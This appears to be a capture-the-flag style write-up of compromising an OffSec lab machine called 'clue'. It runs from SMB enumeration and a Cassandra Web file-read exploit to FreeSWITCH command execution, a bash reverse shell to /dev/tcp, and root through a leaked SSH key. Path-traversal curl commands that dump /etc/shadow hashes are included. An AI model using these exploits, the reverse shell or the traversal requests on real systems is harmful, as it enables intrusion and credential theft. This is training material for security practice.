## Initial Foothold

Autorecon 192.168.207.240
```
PORT     STATE SERVICE          REASON         VERSION
22/tcp   open  ssh              syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 
80/tcp   open  http             syn-ack ttl 61 Apache httpd 2.4.38
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.38 (Debian)
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
139/tcp  open  netbios-ssn?     syn-ack ttl 61
445/tcp  open  netbios-ssn      syn-ack ttl 61 Samba smbd 4.9.5-Debian 
3000/tcp open  ppp?             syn-ack ttl 61
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain
|     Connection: close
|     Server: thin
|_    Request
8021/tcp open  freeswitch-event syn-ack ttl 61 FreeSWITCH mod_event_socket
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (97%)
```

Ports
- 139/445 (smb) - listed shares anonymously. In the backup folder, got all files from `cassandra` and `freeswitch` directory.
```
smbclient //192.168.207.240/backup -N

## In smb
prompt off 
recurse on 
mget *
```
   Enum4linux shows two users `cassie` and `anthony`. Try to grep for their credentials.
```
─(kali㉿kali)-[~/offsec/clue]
└─$ grep -rnIiE "cassie" freeswitch
┌──(kali㉿kali)-[~/offsec/clue]
└─$ grep -rnIiE "cassie" /cassandra
┌──(kali㉿kali)-[~/offsec/clue]
└─$ grep -rnIiE "anthony" /cassandra
┌──(kali㉿kali)-[~/offsec/clue]
└─$ grep -rnIiE "anthony" freeswitch
```


- 80 (web) - 403 forbidden
- 3000 (web) - Cassandra Web. 

Tried to use freeswitch exploit `FreeSWITCH 1.10.1 - Command Execution` but did not work. 
```
┌──(kali㉿kali)-[~/offsec/clue]
└─$ python3 freeswitch.py 192.168.207.240 whoami               
Authentication failed
```

Could not determine freeswitch version. Cassandra web exploit works.
```
┌──(kali㉿kali)-[~/offsec/clue]
└─$ searchsploit cassandra 
 Exploit Title                                                                                                            |  Path

Atrium Software Cassandra NNTP Server 1.10 - Buffer Overflow                                                              | windows/dos/19884.txt
Cassandra Web 0.5.0 - Remote File Read                                                                                    | linux/webapps/49362.py
┌──(kali㉿kali)-[~/offsec/clue]
└─$ searchsploit -m 49362 
  Exploit: Cassandra Web 0.5.0 - Remote File Read
      URL: https://www.exploit-db.com/exploits/49362
     Path: /usr/share/exploitdb/exploits/linux/webapps/49362.py
    Codes: N/A
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/kali/offsec/clue/49362.py
┌──(kali㉿kali)-[~/offsec/clue]
└─$ python3 49362.py 192.168.207.240 /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ntp:x:106:113::/nonexistent:/usr/sbin/nologin
cassandra:x:107:114:Cassandra database,,,:/var/lib/cassandra:/usr/sbin/nologin
cassie:x:1000:1000::/home/cassie:/bin/bash
freeswitch:x:998:998:FreeSWITCH:/var/lib/freeswitch:/bin/false
anthony:x:1001:1001::/home/anthony:/bin/bash

┌──(kali㉿kali)-[~/offsec/clue]
└─$ python3 49362.py 192.168.207.240 /proc/self/cmdline        
/usr/bin/ruby2.5/usr/local/bin/cassandra-web-ucassie-pSecondBiteTheApple330
```

`cassie:SecondBiteTheApple330` are creds for auth to the running apache cassandra database server). Tried to ssh into cassie with those creds but failed.
```
└─$ penelope ssh cassie@192.168.207.240
[+] Listening for reverse shells on 0.0.0.0:4444 -> 127.0.0.1 • 192.168.73.128 • 172.18.0.1 • 172.17.0.1 • 192.168.45.212
The authenticity of host '192.168.207.240 (192.168.207.240)' can't be established.
ED25519 key fingerprint is: SHA256:mqPCrimr9j626KOGoHM+qxgHUOYD4pu1+4KzhIvu5uA
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.207.240' (ED25519) to the list of known hosts.
cassie@192.168.207.240's password: SecondBiteTheApple330
cassie@192.168.207.240: Permission denied (publickey,password).
```

Do deeper digging.
```
┌──(kali㉿kali)-[~/offsec/clue]
└─$ python3 49362.py 192.168.207.240 /home/anthony/.bash_history
Failed to read /home/anthony/.bash_history (perm denied likely)
 ┌──(kali㉿kali)-[~/offsec/clue]
└─$ python3 49362.py 192.168.207.240 /home/anthony/
┌──(kali㉿kali)-[~/offsec/clue]
└─$ python3 49362.py 192.168.207.240 /home/cassie/.bash_history
Failed to read /home/cassie/.bash_history (bad path?)
┌──(kali㉿kali)-[~/offsec/clue]
└─$ python3 49362.py 192.168.207.240 /etc/ssh/sshd_config
...
...
# Example of overriding settings on a per-user basis
#Match User anoncvs
#       X11Forwarding no
#       AllowTcpForwarding no
#       PermitTTY no
#       ForceCommand cvs server

AllowUsers root anthony

┌──(kali㉿kali)-[~/offsec/clue]
└─$ python3 49362.py 192.168.207.240 /home/anthony/.ssh/id_rsa
Failed to read /home/anthony/.ssh/id_rsa (bad path?)
```

Oh only anthony and root are allow ssh access. Give up and cheated. Looks like we should look deeper in `/etc/freeswitch/autoload_configs/event_socket.conf.xml` where the default password is at
```
┌──(kali㉿kali)-[~/offsec/clue]
└─$ python3 49362.py 192.168.207.240 /etc/freeswitch/autoload_configs/event_socket.conf.xml

<configuration name="event_socket.conf" description="Socket Client">
  <settings>
    <param name="nat-map" value="false"/>
    <param name="listen-ip" value="0.0.0.0"/>
    <param name="listen-port" value="8021"/>
    <param name="password" value="StrongClueConEight021"/>
  </settings>
</configuration>
```

Replace this password over the default password in `FreeSWITCH 1.10.1 - Command Execution`
```
┌──(kali㉿kali)-[~/offsec/clue]
└─$ python3 freeswitch.py 192.168.207.240 whoami                                        
Authenticated
Content-Type: api/response
Content-Length: 11
```

This time it worked. Throw a shell back and catch it on penelope port 3000.
```
┌──(kali㉿kali)-[~/offsec/clue]
└─$ python3 freeswitch.py 192.168.207.240 "bash -c 'exec bash -i &>/dev/tcp/192.168.45.212/3000 <&1'"
Authenticated
```

## Privesc

sudo -l. Check SUID, check capabilities. Nothing.

Cannot transfer linpeas for some reason. su to cassie
```
freeswitch@clue:/tmp$ su cassie
Password: SecondBiteTheApple330
```

Can transfer linpeas now. Suspicious ssh file found.
```
══╣ Possible private SSH keys were found!
/home/cassie/id_rsa
```

Obtained root. Did not expect it to be root. Wanted to try on anthony later but won't complain.
```
cassie@clue:~$ chmod 600 id_rsa 
cassie@clue:~$ ssh -i id_rsa root@localhost
```


## Alternative:
We can run cassandra-web. 
```
sudo -u root /usr/local/bin/cassandra-web -B 0.0.0.0:9999 -u cassie -p SecondBiteTheApple330
```
The server is running on 0.0.0.0:9999. We just need to use the exploit here.

We skip using the exploit as it’s just doing a simple GET request. Something like this.
```
curl --path-as-is http://casandra_web/../../../../../../../../etc/passwd
curl --path-as-is http://casandra_web/../../../../../../../../etc/shadow
root:$6$kuXiAC8PIOY2uis9$LrTzlkYSlY485ZREBLW5iPSpNxamM38BL85BPmaIAWp05VlV.tdq0EryiFLbLryvbsGTx50dLnMsxIk7PJB5P1:19209:0:99999:7:::  
cassie:$6$/WeFDwP1CNIN34/z$9woKSLSZhgHw1mX3ou90wnR.i5LHEfeyfHbxu7nYmaZILVrbhHrSeHNGqV0WesuQWGIL7DHEwHKOLK6UX79DI0:19209:0:99999:7:::  
anthony:$6$01NV0gAhVLOnUHb0$byLv3N95fqVvhut9rbsrYOVzi8QseWfkFl7.VDQ.26a.0IkEVR2TDXoTv/KCMLjUOQZMMpkTUdC3WIyqSWQ.Y1:19209:0:99999:7::
```

```
curl --path-as-is http://0.0.0.0:9999/../../../../../../../../../../anthony/.ssh/id_rsa
```

Anthony have id_rsa. This id_rsa don't work on anthony but works on root.